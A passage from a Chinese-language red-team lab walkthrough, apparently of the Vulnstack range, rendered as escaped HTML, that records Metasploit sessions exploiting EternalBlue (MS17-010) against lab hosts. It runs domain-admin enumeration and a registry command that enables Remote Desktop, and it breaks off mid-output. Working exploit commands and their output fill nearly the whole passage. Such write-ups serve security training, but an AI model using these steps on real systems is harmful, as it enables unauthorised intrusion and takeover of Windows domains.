\u003ccode\u003e80\u003c/code\u003e，\u003ccode\u003e136\u003c/code\u003e，\u003ccode\u003e139\u003c/code\u003e，\u003ccode\u003e445\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e竟然还存在\u003ccode\u003e80\u003c/code\u003e端口，我们可以通过之前获得的\u003ccode\u003eRDP\u003c/code\u003e 在\u003ccode\u003ewin7\u003c/code\u003e里面访问，是默认页面\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e尝试永恒之蓝\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e两台机子都存在\u003ccode\u003e445\u003c/code\u003e端口，永恒之蓝漏洞肯定是要尝试的\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e首先使用探测模块探测是否存在永恒之蓝\u003ccode\u003ems17-010\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 auxiliary(scanner/portscan/tcp) \u003e use auxiliary/scanner/smb/smb_ms17_010 \nmsf6 auxiliary(scanner/smb/smb_ms17_010) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e rhost \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e\nmsf6 auxiliary(scanner/smb/smb_ms17_010) \u003e run\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Host \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e likely VULNERABLE to MS17-\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e10! - Windows Server \u003cspan class=\"hljs-number\"\u003e2003\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e3790\u003c/span\u003e x86 (\u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e-bit)\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Scanned \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e of \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hosts (\u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e% complete)\n[*] Auxiliary module execution completed\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 auxiliary(scanner/smb/smb_ms17_010) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e rhost \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e\nmsf6 auxiliary(scanner/smb/smb_ms17_010) \u003e run\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Host \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e likely VULNERABLE to MS17-\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e10! - Windows Server \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e R2 Datacenter \u003cspan class=\"hljs-number\"\u003e7601\u003c/span\u003e Service Pack \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e x64 (\u003cspan class=\"hljs-number\"\u003e64\u003c/span\u003e-bit)\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Scanned \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e of \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hosts (\u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e% complete)\n[*] Auxiliary module execution completed\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e都是可能存在，不管如何都试试\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用永恒之蓝攻击靶机\u003c/p\u003e\n\u003cp\u003eps：payload需要指定为正向连接，因为是在内网环境，靶机没有通向攻击机的路由\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 auxiliary(scanner/smb/smb_ms17_010) \u003e use exploit/windows/smb/ms17_010_eternalblue\nmsf6 exploit(windows/smb/ms17_010_eternalblue) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e payload windows/x64/meterpreter/bind_tc\nmsf6 exploit(windows/smb/ms17_010_eternalblue) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e rhost \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e\nmsf6 exploit(windows/smb/ms17_010_eternalblue) \u003e run\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Using auxiliary/scanner/smb/smb_ms17_010 \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e check\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Host \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e likely VULNERABLE to MS17-\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e10! - Windows Server \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e R2 Datacenter \u003cspan class=\"hljs-number\"\u003e7601\u003c/span\u003e Service Pack \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e x64 (\u003cspan class=\"hljs-number\"\u003e64\u003c/span\u003e-bit)\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Scanned \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e of \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hosts (\u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e% complete)\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - The target \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e vulnerable.\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Connecting to target \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e exploitation.\n[-] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - SMB Negotiation Failure -- this often occurs when lsass crashes.  The target may reboot \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e60\u003c/span\u003e seconds.\n[*] Started bind TCP handler against \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e4444\u003c/span\u003e\n[*] Exploit completed, but no session was created.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e失败，域控没有拿到shell\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 exploit(windows/smb/ms17_010_eternalblue) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e rhost \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e\nmsf6 exploit(windows/smb/ms17_010_eternalblue) \u003e run\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Using auxiliary/scanner/smb/smb_ms17_010 \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e check\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Host \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e likely VULNERABLE to MS17-\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e10! - Windows Server \u003cspan class=\"hljs-number\"\u003e2003\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e3790\u003c/span\u003e x86 (\u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e-bit)\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Scanned \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e of \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hosts (\u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e% complete)\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - The target \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e vulnerable.\n[-] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Exploit aborted due to failure: no-target: This module only supports x64 (\u003cspan class=\"hljs-number\"\u003e64\u003c/span\u003e-bit) targets\n[*] Exploit completed, but no session was created.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e提示该模块仅支持\u003ccode\u003ex64\u003c/code\u003e，但是靶机是\u003ccode\u003ex32\u003c/code\u003e的，换了\u003ccode\u003ems17_010_psexec\u003c/code\u003e ，但是shell死活连不上\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 exploit(windows/smb/ms17_010_psexec) \u003e run\n\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Target OS: Windows Server \u003cspan class=\"hljs-number\"\u003e2003\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e3790\u003c/span\u003e\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Filling barrel \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e fish... done\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - \u0026#x3C;---------------- | Entering Danger Zone | ----------------\u003e\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e -        [*] Preparing dynamite...\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e -                Trying stick \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e (x64)...Miss\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e -                [*] Trying stick \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e (x86)...Boom!\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e -        [+] Successfully Leaked Transaction!\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e -        [+] Successfully caught Fish-\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e-a-barrel\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - \u0026#x3C;---------------- | Leaving Danger Zone | ----------------\u003e\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Reading \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e CONNECTION struct at: \u003cspan class=\"hljs-number\"\u003e0x8d666d60\u003c/span\u003e\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Built a write-what-where primitive...\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Overwrite complete... SYSTEM session obtained!\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Selecting native target\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Uploading payload... xxjxkZjL.exe\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Created \\xxjxkZjL.exe...\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Service started successfully...\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Deleting \\xxjxkZjL.exe...\n[*] Started bind TCP handler against \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e4444\u003c/span\u003e\n[*] Sending stage (\u003cspan class=\"hljs-number\"\u003e176198\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e) to \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e\n[-] Meterpreter session \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e valid \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e will be closed\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e - Meterpreter session \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e closed.  Reason: Died\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e尝试ms17_010_command\u003c/h3\u003e\n\u003cp\u003e因为域成员\u003ccode\u003e141\u003c/code\u003e是\u003ccode\u003e32\u003c/code\u003e位的，MSF的永恒之蓝仅支持\u003ccode\u003ex64\u003c/code\u003e ，所以我们换一个全版本的，仅用来执行命令的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 auxiliary(server/socks_proxy) \u003e use auxiliary/admin/smb/ms17_010_command \nmsf6 auxiliary(admin/smb/ms17_010_command) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e rhost \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e\nmsf6 auxiliary(admin/smb/ms17_010_command) \u003e run\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Target OS: Windows Server \u003cspan class=\"hljs-number\"\u003e2003\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e3790\u003c/span\u003e                                          \n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Filling barrel \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e fish... done                                             \n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - \u0026#x3C;---------------- | Entering Danger Zone | ----------------\u003e                 \n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    -     [*] Preparing dynamite...                                                \n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    -             Trying stick \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e (x64)...Miss                                      \n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    -             [*] Trying stick \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e (x86)...Boom!                                 \n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    -     [+] Successfully Leaked Transaction!                                     \n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    -     [+] Successfully caught Fish-\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e-a-barrel                                 \n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - \u0026#x3C;---------------- | Leaving Danger Zone | ----------------\u003e                  \n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Reading \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e CONNECTION struct at: \u003cspan class=\"hljs-number\"\u003e0x8d66dd60\u003c/span\u003e                                \n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Built a write-what-where primitive...                                        \n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Overwrite complete... SYSTEM session obtained!                               \n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Service start timed out, OK \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e running a command \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e non-service executable...\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Getting the command output...                                                \n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Executing cleanup...    \n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Cleanup was successful                                                       \n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Command completed successfully!                                              \n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Output \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"net group \"\u003c/span\u003eDomain Admins\u003cspan class=\"hljs-string\"\u003e\" /domain\"\u003c/span\u003e:                              \n\nThe request will be processed at a domain controller \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e domain god.org.                                 \n\nGroup name     Domain Admins                        \nComment        ???????                              \n\nMembers                                             \n\n-------------------------------------------------------------------------------                          \nAdministrator            OWA$                                                                            \nThe command completed successfully.                 \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e命令执行成功了，我们换一条命令，将其远程桌面服务打开\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 auxiliary(admin/smb/ms17_010_command) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e command \u003cspan class=\"hljs-string\"\u003e'REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Target OS: Windows Server \u003cspan class=\"hljs-number\"\u003e2003\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e3790\u003c/span\u003e\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - Filling barrel \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e fish... done\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    - \u0026#x3C;---------------- | Entering Danger Zone | ----------------\u003e\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    -     [*] Preparing dynamite...\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    -             Trying stick \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e (x64)...Miss\n[*] \u003cspan 